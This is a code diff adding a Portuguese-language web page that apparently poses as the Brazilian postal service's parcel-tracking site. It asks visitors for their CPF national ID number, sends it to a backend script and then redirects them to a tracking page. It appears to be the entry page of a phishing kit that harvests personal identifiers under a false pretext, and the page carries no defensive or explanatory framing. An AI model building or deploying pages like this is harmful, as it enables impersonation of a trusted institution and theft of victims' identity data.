@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>🟢 CORREIO - ENTRAR</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="images/default.ico">
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .obrigatorio.active { border: 1px solid red !important; }
+        .error, .error.active { width: auto !important; }
+        .textoerror.active { color: red !important; }
+    </style>
+</head>
+<body>
+    <div id="site">
+        <h2>Rastreamento de Encomenda</h2>
+        <p>Digite seu CPF para consultar</p>
+
+        <form class="e_formulario">
+            <input id="input_1734416045" type="text" placeholder="000.000.000-00" />
+            <div class="gpc_campos-erro"></div>
+            <div class="textoerror"></div>
+            <button type="submit"><span>Consultar</span></button>
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form.e_formulario");
+            const inputCPF = document.getElementById("input_1734416045");
+            const btnConsultar = form.querySelector("button");
+            const errorDiv = form.querySelector(".gpc_campos-erro");
+            const textoErrorDiv = document.querySelector(".textoerror");
+
+            inputCPF.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\D/g, "");
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+                e.target.value = value;
+            });
+
+            const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;
+
+            btnConsultar.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const cpf = inputCPF.value.replace(/\D/g, "");
+                errorDiv.classList.remove("active");
+                textoErrorDiv.classList.remove("active");
+                inputCPF.classList.remove("active");
+
+                if (!isValidCPF(cpf)) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = "CPF precisa ter 11 dígitos!";
+                    return;
+                }
+
+                try {
+                    const response = await fetch("api.php", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                        body: new URLSearchParams({ cpf }),
+                    });
+
+                    if (!response.ok) throw new Error("Erro ao validar CPF!");
+
+                    const data = await response.json();
+
+                    if (data.status === 200) {
+                        const currentParams = new URLSearchParams(window.location.search);
+                        window.location.href = `rastreio/index.html?${currentParams.toString()}`;
+                    } else {
+                        throw new Error(data.message || "CPF incorreto! Digite novamente");
+                    }
+                } catch (error) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = error.message;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
